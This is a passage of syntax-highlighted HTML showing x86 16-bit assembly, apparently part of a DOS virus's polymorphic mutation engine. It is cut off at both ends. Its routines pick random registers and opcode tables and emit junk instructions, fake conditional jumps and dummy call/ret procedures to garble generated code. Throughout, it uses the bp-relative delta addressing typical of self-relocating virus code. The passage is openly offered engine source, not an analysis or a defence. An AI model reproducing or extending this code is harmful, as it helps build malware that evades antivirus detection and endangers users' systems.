    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoSubq</span><span class="sc0">

</span><span class="sc1">; Skip 8 bit - couse could be reserved Ax+Bx+Cx+Dx and it would produce</span><span class="sc0">
</span><span class="sc1">; forever loop.</span><span class="sc0">
</span><span class="sc1">; Skip call creation - we could use some reserved register. </span><span class="sc0">
</span><span class="sc1">; But it was probably used in previous procedure, so after call it would be </span><span class="sc0">
</span><span class="sc1">; trashed.</span><span class="sc0">

</span><span class="sc5">Subitq</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">NoSubq</span><span class="sc4">:</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">             </span><span class="sc1">; Get Rnd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Oldz</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; Previous was same ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">GGz</span><span class="sc0">                  </span><span class="sc1">; Again plz...</span><span class="sc0">
</span><span class="sc5">MakeIt4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Oldz</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; Store current</span><span class="sc0">

    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">MTable</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Get procedure offset</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; Call Procedure</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GG</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">FTable</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Imm16</span><span class="sc0">            </span><span class="sc1">; Another table</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AxXchg</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MakeCall</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PFCall</span><span class="sc0">

    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">
</span><span class="sc5">FEntries</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">

</span><span class="sc5">FFriendly</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">            </span><span class="sc1">; Creating of anti-flag-trashing</span><span class="sc0">
</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">NoGarb</span><span class="sc0">              </span><span class="sc1">; opcodes.</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">FEntries</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resv</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">SubIt2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resv2</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoSub2</span><span class="sc0">
</span><span class="sc5">SubIt2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">NoSub2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FTable</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get offset</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">           </span><span class="sc1">; Call procedure</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FFriendly</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">OneByters</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; One byters creation</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">OneByteL</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OneByte</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get it from table</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">OneByte</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc2">03Eh</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc4">,</span><span class="sc2">0FBh</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc0">
</span><span class="sc5">OneByteL</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">OneByte</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">TwoThreeFour16</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; Diff. size opcodes encoding</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetReg16</span><span class="sc0">           </span><span class="sc1">; Choose second byte</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CheckBp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">NormOpL</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">NormOp</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; Get first byte</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">GetSize</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">            </span><span class="sc1">; If there any additional bytes ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ReturnIt</span><span class="sc0">         </span><span class="sc1">; Nope ...</span><span class="sc0">
</span><span class="sc5">FillUp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetMax</span><span class="sc0">         </span><span class="sc1">; Create it...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">FillUp</span><span class="sc0">
</span><span class="sc5">ReturnIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">NormOp</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc2">1Bh</span><span class="sc4">,</span><span class="sc2">2Bh</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">
</span><span class="sc5">NormOpl</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">NormOp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">TwoThreeFour8</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetReg8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CheckBp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">NormOp8L</span><span class="sc0">         </span><span class="sc1">; Same that TwoThreeFour16</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">         </span><span class="sc1">; but for 8bit regs</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">NormOp8</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">GetSize</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ReturnIt8</span><span class="sc0">
</span><span class="sc5">FillUp8</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetMax</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">FillUp8</span><span class="sc0">
</span><span class="sc5">ReturnIt8</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">NormOp8</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">22h</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc4">,</span><span class="sc2">3Ah</span><span class="sc0">
</span><span class="sc5">NormOp8l</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">NormOp8</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">iMM16</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ChooseReg</span><span class="sc0">          </span><span class="sc1">; Choose register</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">         </span><span class="sc1">; Add "mov ax,xxxx"</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">; and we would get "add reg,xxxx"</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetMax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">; Random data</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">iMM8</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; Immediatly 8..</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">         </span><span class="sc1">; Get reg</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; More then Bx ?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">NoSub</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Make it smaller (Ah=Al,Ch=Cl,etc)</span><span class="sc0">
</span><span class="sc5">NoSub</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CReg</span><span class="sc0">           </span><span class="sc1">; Check if reg is used</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">iMM8</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc0">         </span><span class="sc1">; Nope...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">; Encode Mov reg8,xx</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetMax</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">AxZero</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ChooseReg</span><span class="sc0">          </span><span class="sc1">; Get reg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Encode Inc/Dec Reg</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">AxXchg</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CReg</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">BadSituation</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ChooseReg</span><span class="sc0">          </span><span class="sc1">; Encode xchg ax,reg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">BadSituation</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">ChooseReg</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">         </span><span class="sc1">; Get random register</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CReg</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ChooseReg</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return it in al</span><span class="sc0">
</span><span class="sc5">ChooseReg</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">AxImm16</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; Add,Sub,etc... with ax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CReg</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">AxUsed</span><span class="sc0">
</span><span class="sc5">ChooseReg2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">AxTl</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">AxT</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetMax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">AxUsed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">AxT</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc2">35h</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">1Dh</span><span class="sc4">,</span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc4">,</span><span class="sc2">0A9h</span><span class="sc4">,</span><span class="sc2">0A1h</span><span class="sc0">
</span><span class="sc5">AxTl</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">AxT</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">jxx</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; Forward case jumps</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">JCnt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Increase jumps number</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Jcnt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc5">InJxN</span><span class="sc0">         </span><span class="sc1">; If it reached maximum</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">RestoreJx</span><span class="sc0">                </span><span class="sc1">; at one time ?</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">               </span><span class="sc1">; Get one of 16 diff. jxx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">              </span><span class="sc1">; Encode it</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                 </span><span class="sc1">; Store for later patch</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">              </span><span class="sc1">; Create garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">RestoreJx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Jcnt</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">MakeCall</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cnum</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Get current call numbers</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">InCall</span><span class="sc0">               </span><span class="sc1">; creating at one time</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">CallsGone</span><span class="sc0">               </span><span class="sc1">; More then InCall ?</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CallsNum</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc5">CallN</span><span class="sc0"> </span><span class="sc1">; More then table space aviable ?</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">CallsGone</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">JCnt</span><span class="sc4">],</span><span class="sc5">InJmp</span><span class="sc0">         </span><span class="sc1">; Are we inside Jxx proc ?</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">CallSGone</span><span class="sc0">           </span><span class="sc1">; If yes , could we create proc ?</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cnum</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; All ok... Increase proc num</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">             </span><span class="sc1">; Encode Jmp near</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                 </span><span class="sc1">; Store for later patch</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GG</span><span class="sc0">                 </span><span class="sc1">; Create one logical opcode</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                 </span><span class="sc1">; Store offset of procedure</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">              </span><span class="sc1">; Garble it</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">             </span><span class="sc1">; Encode retn</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GG</span><span class="sc0">                 </span><span class="sc1">; Another opcode</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CallsNum</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Store offset of proc</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">; in table</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CCalls</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
